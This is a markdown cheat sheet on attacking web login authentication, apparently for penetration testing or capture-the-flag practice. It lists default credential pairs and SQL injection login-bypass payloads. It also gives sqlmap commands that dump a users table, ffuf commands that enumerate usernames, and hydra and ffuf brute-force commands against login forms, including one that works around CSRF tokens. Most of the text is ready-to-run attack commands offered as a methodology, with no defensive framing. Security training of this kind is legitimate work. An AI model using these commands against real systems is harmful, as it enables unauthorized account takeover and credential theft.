# 🔐 Authentication Attacks

---

## 📖 Description

Authentication vulnerabilities occur when a web application fails to properly verify the identity of users. This can stem from weak or default credentials, lack of brute force protection, verbose error messages that allow username enumeration, or flawed login logic exploitable via SQL injection.

The attack approach is sequential: start with the least noisy technique (default credentials) and escalate towards more aggressive ones (brute force) only when necessary.

---

## 🔎 Detection & Exploitation

---

### 1️⃣ Default Credentials

Always try default credentials first before anything else — misconfigured applications often ship with them and they're never changed. Quick to test and completely silent:

```
admin / admin
admin / password
admin / 1234
administrator / administrator
root / root
guest / guest
```

---

### 2️⃣ SQL Injection

If the login form is vulnerable to SQLi, authentication can be bypassed entirely without knowing any valid credentials. First, look for unusual behavior using basic characters (`'`, `''`, `` ` ``, `"`). If there's a reaction, try the classic bypass payloads:

```sql
-- Single quote
' OR '1'='1
' OR 1=1--
' OR 1=1#
admin'--
admin'#
admin' OR '1'='1
admin' OR 1=1--

-- Double quote
" OR "1"="1
" OR 1=1--
" OR 1=1#
```

If the login reacts to the payloads but none grants direct access, use sqlmap to dump the users table and log in with the real credentials. Save the login request from Burp as `req.txt`, then:

```bash
# Dump the users table directly
sqlmap -r req.txt --batch --dbs
sqlmap -r req.txt --batch -D db_name --tables
sqlmap -r req.txt --batch -D db_name -T users --dump
```

> For a full SQLi methodology reference, see the [SQLi cheatsheet](SQLi.md).

---

### 3️⃣ Username Enumeration

Before brute forcing passwords, check whether the application leaks valid usernames through different error messages (e.g. *"Invalid username"* vs *"Invalid password"*). If it does, enumerate valid users first to narrow down the attack:

```bash
ffuf -u http://TARGET/login \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=FUZZ&password=password123" \
  -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -fr "Invalid username"
```

> Adapt the `-d` parameters and `-fr` filter to match the actual request and error message of the target.

---

### 4️⃣ Brute Force — Known Username

Once a valid username is confirmed, brute force the password with hydra:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt domain.com \
  http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials" \
  -t 30
```

> Adapt the domain, login path, POST parameters, and failure message string to match the target.

---

### 5️⃣ Brute Force — Unknown Username

If no valid username was found during enumeration, brute force both username and password simultaneously:

```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -P /usr/share/wordlists/rockyou.txt domain.com \
  http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials" \
  -t 30
```

If the application requires an active session cookie:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt domain.com \
  http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials:H=Cookie: PHPSESSID=xxxx" \
  -t 30
```

---

### 6️⃣ CSRF Token — Brute Force with ffuf

When the login form includes a CSRF token that changes with each request, hydra won't work since it can't handle dynamic tokens. Use ffuf instead, which can extract and reuse the token per request:

```bash
ffuf -u http://TARGET/login \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=FUZZ&csrf_token=TOKEN" \
  -w /usr/share/wordlists/rockyou.txt \
  -fr "Invalid credentials"
```

> The CSRF token handling strategy depends on the application. In some cases a Burp macro or a custom script is needed to fetch a fresh token before each attempt.
